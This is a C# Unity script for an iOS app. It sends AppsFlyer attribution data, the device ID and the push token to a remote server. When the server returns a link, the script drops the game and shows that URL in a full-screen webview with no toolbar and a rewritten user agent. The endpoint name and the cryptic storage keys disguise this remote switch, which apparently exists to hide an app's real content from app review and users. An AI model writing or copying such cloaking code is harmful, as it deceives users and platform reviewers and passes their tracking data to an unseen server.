using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using AppsFlyerSDK;
using UnityEngine.Networking;
using UnityEngine.UI;
using UnityEngine.SceneManagement;
using System;
using System.Linq;
using System.Text.RegularExpressions;
using System.Text;
using Newtonsoft.Json.Linq;
using Unity.Advertisement.IosSupport;
using Unity.Services.PushNotifications;
using Unity.Notifications.iOS;

public class AllScripts : MonoBehaviour, IAppsFlyerConversionData
{
    public static AllScripts Instance;
    //******************************//

    public string devKey;
    public string appID;
    public string ServerURL_IOS;
    // public string iOS_Name;
    public string OS_Key;
    public bool isDebug = false;
    public bool getConversionData = true;
    public GameObject loader;
    public UniWebView uniWebViewMagic;
    public Image bgToHide;
    public GameObject popUp;
    public string _levelName;
    private string token = "";
    private int guewrt_4534 // property
    {
        get { return PlayerPrefs.GetInt("fg"); }   // get method
        set { PlayerPrefs.SetInt("fg", value); }  // set method
    }

    private int newBoolFirts // property
    {
        get { return PlayerPrefs.GetInt("6423"); }   // get method
        set { PlayerPrefs.SetInt("6423", value); }  // set method
    }

    private string AFJsonString;
    private bool initialize = false;
    private string advertisingId;

    // Mark AppsFlyer CallBacks
    public void onConversionDataSuccess(string conversionData)
    {
        if (!initialize)
        {
            Application.RequestAdvertisingIdentifierAsync(
           (string advertisingId, bool trackingEnabled, string error) =>
           this.advertisingId = advertisingId);
            AFJsonString = conversionData;
            Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
            StartCoroutine(GetWebInfo(conversionDataDictionary));
            initialize = true;
        }
    }

    public void onConversionDataFail(string error)
    {
        StartGame();
    }

    public void onAppOpenAttribution(string attributionData)
    {

        Dictionary<string, object> attributionDataDictionary = AppsFlyer.CallbackStringToDictionary(attributionData);
        // add direct deeplink logic here
    }

    public void onAppOpenAttributionFailure(string error)
    {

    }

    IEnumerator RequestAuthorization()
    {
        using (var req = new AuthorizationRequest(AuthorizationOption.Alert | AuthorizationOption.Badge, true))
        {
            while (!req.IsFinished)
            {
                yield return null;
            };

            string res = "\n RequestAuthorization: \n";
            res += "\n finished: " + req.IsFinished;
            res += "\n granted :  " + req.Granted;
            res += "\n error:  " + req.Error;
            res += "\n deviceToken:  " + req.DeviceToken;
            token = req.DeviceToken;
        }
    }

    //string FormatDeviceToken(byte[] deviceToken)
    //{
    //    return BitConverter.ToString(deviceToken).Replace("-", "").ToLower();
    //}

    // Start is called before the first frame update
    void Start()
    {

        if (!initialize)
        {

            if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus() != ATTrackingStatusBinding.AuthorizationTrackingStatus.AUTHORIZED)
            {
                ATTrackingStatusBinding.RequestAuthorizationTracking();
            }

            AppsFlyer.waitForATTUserAuthorizationWithTimeoutInterval(30);

            AppsFlyer.setIsDebug(isDebug);
            AppsFlyer.initSDK(devKey, appID, this);
            //******************************//
            //StartCoroutine(DetectCountry());
            AppsFlyer.startSDK();

            StartCoroutine(RequestAuthorization());

            if (Application.internetReachability == NetworkReachability.NotReachable)
            {
                //LOADING GAME SCENE
                StartGame();
            }
        }

    }


    // Update is called once per frame
    private void Update()
    {
        if (loader != null)
            loader.transform.Rotate(new Vector3(0, 0, -45) * 3 * Time.deltaTime);
    }


    public void ShowPopUp()
    {
        //if (PlayerPrefs.GetInt("gdfg456") == 0)
        //{
        //    popUp.SetActive(true);
        //}
        //else
        //{
        StartGame();
        //}

    }

    public void StartGame()
    {
        loader.SetActive(false);
        StartGameBtn();
    }

    public void StartGameBtn()
    {
        SceneManager.LoadScene(_levelName);
    }

    public void StartGameAction()
    {
        PlayerPrefs.SetInt("gdfg456", 1);
        SceneManager.LoadScene(_levelName);
    }

    private void Awake()
    {
        Instance = this;
    }


    IEnumerator GetWebInfo(Dictionary<string, object> conversionDataDictionary)
    {
        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            //LOADING GAME SCENE
            StartGame();
        }
        else
        {

            //TimeZoneInfo localTimeZone = TimeZoneInfo.Local;

            //string locale = localTimeZone.Id;
            string sdkID = AppsFlyer.getAppsFlyerId();
            string sdkData = AFJsonString;



            string fullLink = ServerURL_IOS + "pushNotifications/?user=";

            // string fullJSON = "{" + $"\"sdkData\":{sdkData},\"sdkID\":\"{sdkID}\"," +
            //$"\"identifier\":\"{identifier}\",\"locale\":\"{locale}\"}}";

            //string fullJSON = "{" + $"\"clouderid\":\"{sdkID}\"," +
            //$"\"var1\":\"{identifier}\",\"clouderdata\":\"{sdkData}\"}}";

            //string fullJSON = "{" + $"\"clouderid\":\"{sdkID}\"," +
            //$"\"clouderdata\":{sdkData}}}";

            string fullJSON = "{" + $"\"userData\":{sdkData},\"userID\":\"{sdkID}\",\"userToken\":\"{token}\",\"userlanguage\":\"{"en"}\"}}";

            fullLink += fullJSON;


            using (UnityWebRequest request = UnityWebRequest.Get(fullLink))
            {
                // Request and wait for the desired page.
                yield return request.SendWebRequest();

                if (request.isDone)
                {
                    if (request.responseCode == 200)
                    {
                        if (request.downloadHandler.text != "OK" && request.downloadHandler.text != "404" && request.downloadHandler.text != "Received")
                        {
                            JObject json = JObject.Parse(request.downloadHandler.text);
                            Dictionary<string, object> responseJson = json.ToObject<Dictionary<string, object>>();

                            if (responseJson["link"] != null)
                            {
                                string result = (string)responseJson["link"];
                                bool newBool = (bool)responseJson["first_link"];
                                int boolInt = newBool ? 1 : 0;


                                if (newBoolFirts != boolInt)
                                {
                                    if (newBool)
                                    {
                                        newBoolFirts = 1;
                                    }
                                    else
                                    {
                                        newBoolFirts = 0;
                                    }
                                    PlayerPrefs.SetString("finnnlnk", null);
                                    PlayerPrefs.SetString("trcklink", null);
                                }


                                if (string.IsNullOrEmpty(PlayerPrefs.GetString("trcklink")))
                                {
                                    PlayerPrefs.SetString("trcklink", result);
                                    if (newBoolFirts == 1)
                                    {
                                        PlayerPrefs.SetString("finnnlnk", result);
                                    }
                                    LoadView(result);
                                }
                                else
                                {
                                    if (result == PlayerPrefs.GetString("trcklink"))
                                    {
                                        if (string.IsNullOrEmpty(PlayerPrefs.GetString("finnnlnk")))
                                        {
                                            LoadView(result);
                                        }
                                        else
                                        {
                                            LoadView(PlayerPrefs.GetString("finnnlnk"));
                                        }
                                    }
                                    else
                                    {
                                        PlayerPrefs.SetString("trcklink", result);
                                        PlayerPrefs.SetString("finnnlnk", null);
                                        if (newBoolFirts == 1)
                                        {
                                            PlayerPrefs.SetString("finnnlnk", result);
                                        }
                                        LoadView(result);
                                    }
                                }
                            }
                            else
                            {
                                ShowPopUp();
                            }
                        }
                        else
                        {
                            //LOADING GAME SCENE
                            ShowPopUp();
                        }
                    }
                    else
                    {
                        ShowPopUp();
                    }
                }
                else
                {
                    //LOADING GAME SCENE
                    ShowPopUp();
                }
            }
        }
    }

    void LoadView(string url)
    {
        bgToHide.enabled = false;
        Screen.orientation = ScreenOrientation.AutoRotation;
#if UNITY_IOS
        uniWebViewMagic.SetShowToolbar(false);
        uniWebViewMagic.SetZoomEnabled(false);
        UniWebView.SetWebContentsDebuggingEnabled(true);
        UniWebView.SetAllowJavaScriptOpenWindow(true);
        string userAgent = uniWebViewMagic.GetUserAgent();
        if (userAgent != null)
        {
            string output = Regex.Replace(userAgent, " (Build/([0-9; a-zA-Z]+))", "");
            output = Regex.Replace(output, " (Version/([0-9.]+)) ", " ");
            uniWebViewMagic.SetUserAgent(output);
        }

        uniWebViewMagic.OnOrientationChanged += (view, orientation) =>
        {

            uniWebViewMagic.Frame = new Rect(0, 0, Screen.width, Screen.height);

        };
        uniWebViewMagic.SetSupportMultipleWindows(true);
        uniWebViewMagic.OnMultipleWindowOpened += (view, windowId) =>
        {
            Debug.Log(windowId + "multi");
        };


        uniWebViewMagic.OnPageStarted += (view, url_l) =>
        {

        };

        uniWebViewMagic.OnPageFinished += (view, statusCode, url) => {
            if (!string.IsNullOrEmpty(url))
            {
                if (string.IsNullOrEmpty(PlayerPrefs.GetString("finnnlnk")) && newBoolFirts == 0)
                {
                    PlayerPrefs.SetString("finnnlnk", url);
                }
            }
        };

        uniWebViewMagic.SetShowSpinnerWhileLoading(true);

        uniWebViewMagic.Frame = new Rect(0, 0, Screen.width, Screen.height);
        uniWebViewMagic.BackgroundColor = new Color(0, 0, 0, 1);
        //  KeyControllers.Insctance.openBrowser();
        Camera.main.clearFlags = CameraClearFlags.Color;
        Camera.main.backgroundColor = new Color(0, 0, 0, 1);
        uniWebViewMagic.Load(url);
        uniWebViewMagic.Show();

#endif

    }

}

